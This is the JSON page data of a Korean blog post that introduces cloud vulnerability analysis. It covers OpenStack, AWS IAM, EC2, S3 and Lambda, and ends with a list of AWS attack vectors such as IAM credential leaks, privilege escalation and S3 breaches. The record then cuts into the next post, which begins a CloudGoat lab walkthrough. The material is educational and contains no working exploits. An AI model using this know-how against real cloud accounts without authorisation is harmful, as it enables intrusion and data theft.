{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/cloud-service-vuln-0/",
    "result": {"data":{"cur":{"id":"3598a0dc-de2b-598a-bc02-4b43a646bcfa","html":"<h1 id=\"클라우드-서비스-취약점-분석-0\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-0\" aria-label=\"클라우드 서비스 취약점 분석 0 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우드 서비스 취약점 분석 0</h1>\n<h1 id=\"클라우드-컴퓨팅-보안\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%BB%B4%ED%93%A8%ED%8C%85-%EB%B3%B4%EC%95%88\" aria-label=\"클라우드 컴퓨팅 보안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우드 컴퓨팅 보안</h1>\n<ul>\n<li>기업, 조직 내의 데이터, 애플리케이션, 워크로드를 클라우드 컴퓨팅에 저장하고 다양한 서비스로 활용하며 서로가 공유하면서 지속적으로 변화가 발생합니다. 이와 동시에 새로운 보안 위협과 과제도 생겨나며 많은 양의 데이터가 퍼블릭 클라우드 서비스에 저장되면서 해커들의 공격 목표가 됐습니다.</li>\n</ul>\n<h1 id=\"public-cloud---private-cloud\" style=\"position:relative;\"><a href=\"#public-cloud---private-cloud\" aria-label=\"public cloud   private cloud permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Public Cloud &#x26;  Private Cloud</h1>\n<h3 id=\"public-cloud\" style=\"position:relative;\"><a href=\"#public-cloud\" aria-label=\"public cloud permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Public Cloud</h3>\n<ul>\n<li>Azure, AWS, GCP, Alibaba, NCP 등 다양한 클라우드 서비스</li>\n<li>LasS, PasS, SaaS 등 다양한 스펙트럼의 서비스 제공</li>\n</ul>\n<h3 id=\"private-cloud\" style=\"position:relative;\"><a href=\"#private-cloud\" aria-label=\"private cloud permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Private Cloud</h3>\n<ul>\n<li>조직 내 클라우드, 개인정보 관리 등 직접 구축할 이유가 있을 때 사용</li>\n<li>Public Cloud 사업자 시작 이전 단계가 필요한 경우 사용</li>\n<li>OpenStack을 주로 많이 이용</li>\n</ul>\n<h3 id=\"openstack\" style=\"position:relative;\"><a href=\"#openstack\" aria-label=\"openstack permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>OpenStack</h3>\n<ul>\n<li>Rackspace, NASA가 공동개발로 2010년에 Release한 오픈 소스 클라우드 컴퓨팅 플랫폼입니다.</li>\n<li>이미징, 네트워킹, 컴퓨팅, 볼륨 관리 및 인증 관리 등 클라우드 서비스를 제공하기 위해 각각의 자원관리 지능을 프로젝트 단위로 관리합니다.</li>\n<li>실제로는 EC2, VCP, … 각 역활에 대해서 호환되는 정도가 많습니다.</li>\n<li>클라우드 시스템을 구축할 때는 가상화가 필수 이며 이미지, 볼륨을 관리할 시스템이 필요합니다.</li>\n</ul>\n<p><img src=\"/ad9c44d89f3247960fbf97c3c28f8866/overview-diagram-new.svg\" alt=\"https://www.openstack.org/\"></p>\n<p><a href=\"https://www.openstack.org/\">https://www.openstack.org/</a></p>\n<h3 id=\"nova-compute-service\" style=\"position:relative;\"><a href=\"#nova-compute-service\" aria-label=\"nova compute service permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Nova Compute Service</h3>\n<ul>\n<li>OpenStack 에서 가장 중요한 서비스에 해당되며, Hyper-V를 호출해서 각 인스터를 생성하고 관리하는 역활을 수행합니다.</li>\n<li>대시보드 등에서 RESETful API 형태인 nova-api를 통해서 인스턴스 생성 등의 명령을 전달합니다.</li>\n<li>Nova-Computer 를 거쳐서 Hyper-V에 명령을 전달하고,최종적으로 명령을 수행합니다.</li>\n<li>생성된 인스턴스는 nova-console을 통해 통신이 가능합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 141.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,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'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"https://docs.openstack.org/nova/pike/user/architecture.html\"\n        title=\"https://docs.openstack.org/nova/pike/user/architecture.html\"\n        src=\"/static/c465a15b2718d776f9adf0c859731e9e/37523/nova-arch.png\"\n        srcset=\"/static/c465a15b2718d776f9adf0c859731e9e/e9ff0/nova-arch.png 180w,\n/static/c465a15b2718d776f9adf0c859731e9e/f21e7/nova-arch.png 360w,\n/static/c465a15b2718d776f9adf0c859731e9e/37523/nova-arch.png 720w,\n/static/c465a15b2718d776f9adf0c859731e9e/302a4/nova-arch.png 1080w,\n/static/c465a15b2718d776f9adf0c859731e9e/07a9c/nova-arch.png 1440w,\n/static/c465a15b2718d776f9adf0c859731e9e/dca52/nova-arch.png 1550w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span>)</p>\n<p><a href=\"https://docs.openstack.org/nova/pike/user/architecture.html\">https://docs.openstack.org/nova/pike/user/architecture.html</a></p>\n<h1 id=\"aws-iam\" style=\"position:relative;\"><a href=\"#aws-iam\" aria-label=\"aws iam permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>AWS IAM</h1>\n<ul>\n<li>AWS 리소스에 대한 권한 및 접근 제어를 리소스별로 세분화하여 제어할 수 있는 서비스 입니다.</li>\n<li>Group, User, Role, Policy로 설정이 가능합니다.</li>\n<li>권한 상승, 유출 문제 등 취약저 분석 과정에서 가장 눈여겨봐야 하는 부분중 하나입니다.</li>\n<li>주로 구축했던 시기에 취약점이 발생되어 노출이 되는 경우 입니다.</li>\n</ul>\n<h3 id=\"pbac-설명\" style=\"position:relative;\"><a href=\"#pbac-%EC%84%A4%EB%AA%85\" aria-label=\"pbac 설명 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PBAC 설명</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">[사용자]\n피터 - 기사     &lt;그룹: 공격대1>\n케빈 - 마법사   &lt;그룹: 공격대1>\n레이 - 힐러     &lt;그룹: 공격대1>\n\n[그룹]\n공격대1         &lt;역활: ['몬스터 잡기']>\n\n[역활]\n몬스터 잡기     &lt;정책:  [일반 공격]>\n\n[정책]\nAllow 일반 공격 if 사용자.마법사? == True (MP Object 사용)\nAllow 일반 공격 if 사용자.전사? == True (HP Object 사용)\nAllow 일반 공격 if 사용자.힐러? == True (GP Object 사용)</code></pre></div>\n<ul>\n<li>관리의 용이성을 위해 동일한 그룹내에 사용자를 편성 합니다.</li>\n<li>편성된 그룹에 한하여 수행할 수있는 역활을 부여합니다.</li>\n<li>역활 수행시 그룹 내 정해진 사용자에 한하여 수행하도록 정책을 설정합니다.</li>\n<li>역활 수행시 정해진 객체에 한해서 접근하여 수행하도록 정책을 설정합니다.</li>\n</ul>\n<h3 id=\"iam-정책\" style=\"position:relative;\"><a href=\"#iam-%EC%A0%95%EC%B1%85\" aria-label=\"iam 정책 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>IAM 정책</h3>\n<ul>\n<li>JSON 포맷을 사용하며 각 데이터를 세분화해서 관리를 진행합니다.</li>\n</ul>\n<p><a href=\"https://docs.aws.amazon.com/ko_kr/IAM/latest/UserGuide/reference_policies_grammar.html\">IAM JSON 정책 언어의 문법</a></p>\n<h1 id=\"ec2\" style=\"position:relative;\"><a href=\"#ec2\" aria-label=\"ec2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>EC2</h1>\n<ul>\n<li>virtualization Compute Instance, 가장 일반적으로 생성해서 사용하는 서비스입니다.</li>\n<li>AMI (Image), EBS(Volume)을 이용해서 인스턴스 백업이 가능합니다.</li>\n<li>외부에서 Exploit 진행시 비중이 가장 높은 인스턴스 입니다.</li>\n</ul>\n<h1 id=\"s3\" style=\"position:relative;\"><a href=\"#s3\" aria-label=\"s3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>S3</h1>\n<ul>\n<li>업로드, 다운로드 등의 행위로만 구성된 Storage Instance 입니다.</li>\n<li>정적 웹 서비스 요소로 구축이 가능합니다.</li>\n<li>보안사고에서 자주 언급된는 S3 data breach가 이 곳의 데이터 유출을 말합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">https://s3.console.aws.amazon.com/s3/home?region=ap-northeast-2</code></pre></div>\n<h1 id=\"lambda\" style=\"position:relative;\"><a href=\"#lambda\" aria-label=\"lambda permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lambda</h1>\n<ul>\n<li>이벤트 기반의 서버리스 서비스 인스턴스 (Python, nodeJS, Go, .NET, Ruby 지원) 입니다.</li>\n<li>내부적으로 Amazon Linux AMI에서 생성되는 컨테이너, +egress controller</li>\n<li>API Gateway, S3, SQ3, SNS 등과의 다양한 조합으로 사용가능한 서버리스 구조입니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">https://console.aws.amazon.com/lambda/home?region=ap-northeast-2</code></pre></div>\n<h1 id=\"aws-공격-벡터\" style=\"position:relative;\"><a href=\"#aws-%EA%B3%B5%EA%B2%A9-%EB%B2%A1%ED%84%B0\" aria-label=\"aws 공격 벡터 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>AWS 공격 벡터</h1>\n<ul>\n<li>IAM 의 권한 문제로 인해 많은 보안 문제가 야기됩니다.</li>\n<li>IAM Leak  (환경 변수, Instance Post Exploitation, SSRF…)</li>\n<li>IAM Privilege Escalation</li>\n<li>S3 Data Breach</li>\n<li>개발 구축 환경에서 발생 가능한 취약점 (CI/CD, Code Deploy, Terraform, …)</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#public-cloud\">Public Cloud</a></li>\n<li><a href=\"#private-cloud\">Private Cloud</a></li>\n<li><a href=\"#openstack\">OpenStack</a></li>\n<li><a href=\"#nova-compute-service\">Nova Compute Service</a></li>\n<li><a href=\"#pbac-%EC%84%A4%EB%AA%85\">PBAC 설명</a></li>\n<li><a href=\"#iam-%EC%A0%95%EC%B1%85\">IAM 정책</a></li>\n</ul>\n</div>","excerpt":"클라우드 서비스 취약점 분석 0 클라우드 컴퓨팅 보안 기업, 조직 내의 데이터, 애플리케이션, 워크로드를 클라우드 컴퓨팅에 저장하고 다양한 서비스로 활용하며 서로가 공유하면서 지속적으로 변화가 발생합니다. 이와 동시에 새로운 보안 위협과 과제도 생겨나며 많은 양의 데이터가 퍼블릭 클라우드 서비스에 저장되면서 해커들의 공격 목표가 됐습니다. Public Cloud &  Private Cloud Public Cloud Azure, AWS, GCP, Alibaba, NCP 등 다양한 클라우드 서비스 LasS, PasS, SaaS 등 다양한 스펙트럼의 서비스 제공 Private Cloud 조직 내 클라우드, 개인정보 관리 등 직접 구축할 이유가 있을 때 사용 Public Cloud 사업자 시작 이전 단계가 필요한 경우 사용 OpenStack을 주로 많이 이용 OpenStack Rackspace, NASA가 공동개발로 2010년에 Release한 오픈 소스 클라우드 컴퓨팅 플랫폼입니다. 이…","frontmatter":{"date":"December 31, 2021","title":"클라우드 서비스 취약점 분석 0 (클라우드 서비스 취약점 개요)","categories":"CLOUD","author":"Zer0Luck","emoji":"🤭"},"fields":{"slug":"/cloud-service-vuln-0/"}},"next":{"id":"91bbce86-6f64-5ed2-8f9a-2b6a4ea1a6ca","html":"<h1 id=\"클라우드-서비스-취약점-분석-5\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-5\" aria-label=\"클라우드 서비스 취약점 분석 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우드 서비스 취약점 분석 5</h1>\n<h1 id=\"scenario-4--iam-privilege-escalation-by-attachment\" style=\"position:relative;\"><a href=\"#scenario-4--iam-privilege-escalation-by-attachment\" aria-label=\"scenario 4  iam privilege escalation by attachment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[Scenario 4]:  IAM Privilege Escalation By Attachment</h1>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">Size: Medium\nDifficulty: Moderate\nCommand: $ ./cloudgoat.py create iam_privesc_by_attachment</code></pre></div>\n<h2 id=\"시나리오-개요\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\" aria-label=\"시나리오 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 개요</h2>\n<h3 id=\"자원\" style=\"position:relative;\"><a 